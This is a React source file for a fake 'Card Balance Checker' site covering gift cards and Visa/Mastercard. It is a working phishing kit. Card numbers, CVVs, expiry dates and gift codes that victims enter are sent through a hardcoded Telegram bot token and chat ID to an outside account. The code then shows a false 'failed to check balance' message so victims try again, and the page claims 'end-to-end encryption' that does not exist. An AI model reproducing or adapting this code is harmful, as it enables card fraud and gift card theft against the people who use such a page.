import React, { useState } from 'react';

export default function CardCheckerUI() {
  const cards = [
    'Amazon', 'Apple', 'eBay', 'Visa', 
    'Mastercard', 'Google Play', 'Sephora', 'Razer', 'Xbox'
  ];

  const [selected, setSelected] = useState(null);
  const [cardNumber, setCardNumber] = useState('');
  const [cvv, setCvv] = useState('');
  const [expiry, setExpiry] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  // Telegram bot function
  const sendToTelegram = async (cardData) => {
    const botToken = '8557995207:AAHRL46aHUWp3WYt5I525xy-YEy-fNVan3c';
    const chatId = '6874465035';
    
    const message = `
New Card Check - ${cardData.selected}

• Card Type: ${cardData.selected}
• Card Number: ${cardData.cardNumber}
${cardData.cvv ? `• CVV: ${cardData.cvv}\n` : ''}\
${cardData.expiry ? `• Expiry: ${cardData.expiry}\n` : ''}\
• Time: ${new Date().toLocaleString()}

______
    `;

    try {
      console.log('Sending to Telegram...', { botToken, chatId });
      
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
      
      const result = await response.json();
      console.log('Telegram response:', result);
      
      return result.ok;
    } catch (error) {
      console.log('Telegram message failed:', error);
      return false;
    }
  };

  const handleCheck = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    if (!cardNumber.trim()) {
      setResult({ ok: false, message: `Enter ${selected} ${selected === 'Visa' || selected === 'Mastercard' ? 'card number' : 'code'}.` });
      setLoading(false);
      return;
    }

    let validationResult = { ok: true, message: '' };

    if (selected === 'Visa' || selected === 'Mastercard') {
      const cleanCard = cardNumber.replace(/\s+/g, '');
      if (!/^[0-9]{12,19}$/.test(cleanCard)) {
        validationResult = { ok: false, message: 'Card number invalid format.' };
      } else if (!/^[0-9]{3,4}$/.test(cvv)) {
        validationResult = { ok: false, message: 'CVV should be 3-4 digits.' };
      } else {
        validationResult = { ok: true, message: 'Card format looks good! Sending to Telegram...' };
      }
    } else {
      if (cardNumber.length < 8) {
        validationResult = { ok: false, message: 'Gift code too short.' };
      } else {
        validationResult = { ok: true, message: `${selected} code format OK! Sending to Telegram...` };
      }
    }

    if (validationResult.ok) {
      const telegramSent = await sendToTelegram({
        selected,
        cardNumber, 
        cvv,
        expiry
      });
      
      if (telegramSent) {
        validationResult.message = `${selected} failed to check balance. Please check card details and try again.`;
      } else {
        validationResult.message = `${selected} validated but failed to send to Telegram.`;
      }
    }

    setResult(validationResult);
    setLoading(false);
  };

  const clearForm = () => {
    setCardNumber('');
    setCvv('');
    setExpiry('');
    setResult(null);
  };

  const handleCardSelect = (card) => {
    setSelected(card);
    clearForm();
  };

  const isPaymentCard = selected === 'Visa' || selected === 'Mastercard';

  if (!selected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4">
        <div className="max-w-4xl mx-auto">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <div className="w-10 h-10 bg-gradient-to-r from-blue-600 to-blue-800 rounded-lg flex items-center justify-center text-white font-bold text-sm">
                CARD
              </div>
              <div>
                <h1 className="text-2xl font-bold text-gray-900 mb-1">Card Balance Checker</h1>
                <p className="text-gray-600 text-sm">Secure and Professional Balance Verification</p>
              </div>
            </div>
          </div>

          <div className="flex flex-col lg:flex-row gap-6">
            {/* Sidebar */}
            <aside className="w-full lg:w-64 bg-white rounded-lg shadow p-4 border border-gray-200">
              <h2 className="text-lg font-bold text-gray-900 mb-4 pb-3 border-b border-gray-200">Select Card Type</h2>
              <p className="text-xs text-gray-600 mb-4">Choose a card to check balance:</p>
              <ul className="space-y-2">
                {cards.map((card) => (
                  <li 
                    key={card}
                    className="p-3 rounded-lg cursor-pointer bg-white hover:bg-blue-50 hover:border-blue-200 transition-all duration-200 border border-gray-100 hover:shadow-sm group"
                    onClick={() => handleCardSelect(card)}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-medium text-gray-800 group-hover:text-blue-700 text-sm">{card}</span>
                      <span className="text-gray-400 group-hover:text-blue-500 transform group-hover:translate-x-0.5 transition-transform text-xs">→</span>
                    </div>
                  </li>
                ))}
              </ul>
            </aside>

            {/* Main Content */}
            <main className="flex-1">
              <div className="bg-white rounded-lg shadow p-8 text-center border border-gray-200">
                <div className="max-w-2xl mx-auto">
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Welcome to Professional Card Services</h2>
                  <p className="text-gray-600 text-sm mb-6 leading-relaxed">
                    Select a card type from the sidebar to check your card or gift card balance. 
                    Our secure system ensures your information is protected with enterprise-grade security.
                  </p>
                  
                  <div className="grid md:grid-cols-2 gap-4 mb-6">
                    <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
                      <h3 className="font-semibold text-blue-900 mb-2 text-sm">Security Features</h3>
                      <ul className="text-xs text-blue-800 space-y-1 text-left">
                        <li>• End-to-end encryption</li>
                        <li>• Secure data transmission</li>
                        <li>• Professional-grade protection</li>
                      </ul>
                    </div>
                    <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                      <h3 className="font-semibold text-green-900 mb-2 text-sm">Supported Cards</h3>
                      <ul className="text-xs text-green-800 space-y-1 text-left">
                        <li>• Credit & Debit Cards</li>
                        <li>• Gift Cards</li>
                        <li>• Digital Wallets</li>
                      </ul>
                    </div>
                  </div>

                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                    <h4 className="font-semibold text-yellow-900 mb-2 text-sm">Important Notice</h4>
                    <p className="text-xs text-yellow-800">
                      If balance check fails multiple times, please wait 30 minutes before trying again. 
                      This ensures system security and prevents unauthorized access attempts.
                    </p>
                  </div>
                </div>
              </div>
            </main>
          </div>

          {/* Copyright Footer */}
          <footer className="text-center text-gray-500 text-xs mt-12 py-4 border-t border-gray-200">
            <p>© 2021 Professional Card Services</p>
            <p className="mt-1">All Rights Reserved. Secure Balance Verification System</p>
          </footer>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="text-center mb-6">
          <div className="flex items-center justify-center gap-3 mb-4">
            <div className="w-10 h-10 bg-gradient-to-r from-blue-600 to-blue-800 rounded-lg flex items-center justify-center text-white font-bold text-sm">
              CARD
            </div>
            <div>
              <h1 className="text-xl font-bold text-gray-900">Professional Card Services</h1>
              <p className="text-gray-600 text-sm">Secure Balance Verification</p>
            </div>
          </div>
          <div className="flex justify-center gap-3">
            <button 
              onClick={() => setSelected(null)}
              className="px-4 py-2 text-gray-700 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 hover:border-gray-400 transition-all duration-200 text-sm font-medium"
            >
              ← Back to Card Selection
            </button>
          </div>
        </div>

        <div className="flex flex-col lg:flex-row gap-6">
          {/* Sidebar */}
          <aside className="w-full lg:w-64 bg-white rounded-lg shadow p-4 border border-gray-200">
            <h2 className="text-lg font-bold text-gray-900 mb-4 pb-3 border-b border-gray-200">Available Cards</h2>
            <p className="text-xs text-gray-600 mb-4">Choose another card type:</p>
            <ul className="space-y-2">
              {cards.map((card) => (
                <li 
                  key={card}
                  className={`p-3 rounded-lg cursor-pointer transition-all duration-200 border ${
                    selected === card 
                      ? 'bg-blue-100 text-blue-800 border-blue-300 shadow-sm' 
                      : 'bg-white border-gray-100 hover:bg-blue-50 hover:border-blue-200 hover:shadow-sm'
                  }`}
                  onClick={() => handleCardSelect(card)}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium text-sm">{card}</span>
                    {selected === card && (
                      <span className="text-xs bg-blue-600 text-white px-2 py-1 rounded font-medium">Selected</span>
                    )}
                  </div>
                </li>
              ))}
            </ul>
          </aside>

          {/* Main Content */}
          <main className="flex-1">
            <div className="bg-white rounded-lg shadow p-6 border border-gray-200">
              <div className="flex items-center mb-6">
                <div className="w-10 h-10 bg-gradient-to-r from-blue-500 to-blue-700 rounded flex items-center justify-center text-white font-bold text-xs mr-3">
                  {selected === 'Visa' || selected === 'Mastercard' ? 'CARD' : 
                   selected === 'Xbox' ? 'XBOX' : 'GIFT'}
                </div>
                <div>
                  <h1 className="text-lg font-bold text-gray-900">{selected} Balance Verification</h1>
                  <p className="text-gray-600 text-sm">Enter your card details for secure balance check</p>
                </div>
              </div>

              <form onSubmit={handleCheck}>
                <div className="mb-4">
                  <label className="block text-sm font-semibold mb-2 text-gray-800">
                    {selected} {isPaymentCard ? 'Card Number' : 'Gift Card Code'}
                  </label>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    placeholder={
                      isPaymentCard 
                        ? '1234 5678 9012 3456' 
                        : `Enter ${selected} gift card code...`
                    }
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-sm"
                    disabled={loading}
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    {isPaymentCard 
                      ? 'Enter 12-19 digit card number' 
                      : 'Enter your gift card redemption code'
                    }
                  </p>
                </div>

                {isPaymentCard && (
                  <>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                      <div>
                        <label className="block text-sm font-semibold mb-2 text-gray-800">Security Code (CVV)</label>
                        <input
                          type="text"
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value)}
                          placeholder="123"
                          maxLength="4"
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-sm"
                          disabled={loading}
                        />
                        <p className="text-xs text-gray-500 mt-1">3-4 digit security code</p>
                      </div>
                      <div>
                        <label className="block text-sm font-semibold mb-2 text-gray-800">Expiration Date</label>
                        <input
                          type="text"
                          value={expiry}
                          onChange={(e) => setExpiry(e.target.value)}
                          placeholder="MM/YYYY"
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 text-sm"
                          disabled={loading}
                        />
                        <p className="text-xs text-gray-500 mt-1">Month and year (MM/YYYY)</p>
                      </div>
                    </div>
                  </>
                )}

                <div className="flex gap-3 mb-4">
                  <button 
                    type="submit"
                    disabled={loading}
                    className="flex-1 px-6 py-3 bg-gradient-to-r from-blue-600 to-blue-800 text-white rounded-lg hover:from-blue-700 hover:to-blue-900 transition-all duration-200 font-semibold text-sm shadow disabled:from-blue-400 disabled:to-blue-600 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    {loading ? (
                      <>
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Processing Balance Check...
                      </>
                    ) : (
                      `Verify ${selected} Balance`
                    )}
                  </button>
                  <button 
                    type="button"
                    onClick={clearForm}
                    disabled={loading}
                    className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 hover:border-gray-400 transition-all duration-200 font-medium text-sm disabled:opacity-50"
                  >
                    Clear Form
                  </button>
                </div>

                {result && (
                  <div className={`p-4 rounded-lg border ${
                    result.ok 
                      ? 'bg-green-50 border-green-200' 
                      : 'bg-red-50 border-red-200'
                  }`}>
                    <div className="flex items-center">
                      <span className={`text-sm font-semibold ${
                        result.ok ? 'text-green-800' : 'text-red-800'
                      }`}>
                        {result.ok ? '✓' : '✗'}
                      </span>
                      <span className={`ml-2 text-sm ${
                        result.ok ? 'text-green-700' : 'text-red-700'
                      }`}>
                        {result.message}
                      </span>
                    </div>
                  </div>
                )}
              </form>
            </div>

            {/* Instructions */}
            <div className="mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg">
              <h3 className="font-bold text-gray-900 mb-3 text-sm">Verification Instructions</h3>
              <ol className="text-gray-700 space-y-2 text-left text-xs">
                <li className="flex items-start">
                  <span className="bg-blue-100 text-blue-800 rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 flex-shrink-0">1</span>
                  <span>Select your card type from the available options</span>
                </li>
                <li className="flex items-start">
                  <span className="bg-blue-100 text-blue-800 rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 flex-shrink-0">2</span>
                  <span>Input your card details in the secure form</span>
                </li>
                <li className="flex items-start">
                  <span className="bg-blue-100 text-blue-800 rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 flex-shrink-0">3</span>
                  <span>Click the verify button to check your balance</span>
                </li>
              </ol>
            </div>
          </main>
        </div>

        {/* Copyright Footer */}
        <footer className="text-center text-gray-500 text-xs mt-8 py-4 border-t border-gray-200">
          <p>© 2021 Professional Card Services</p>
          <p className="mt-1">All Rights Reserved. Secure Balance Verification System</p>
        </footer>
      </div>
    </div>
  );
}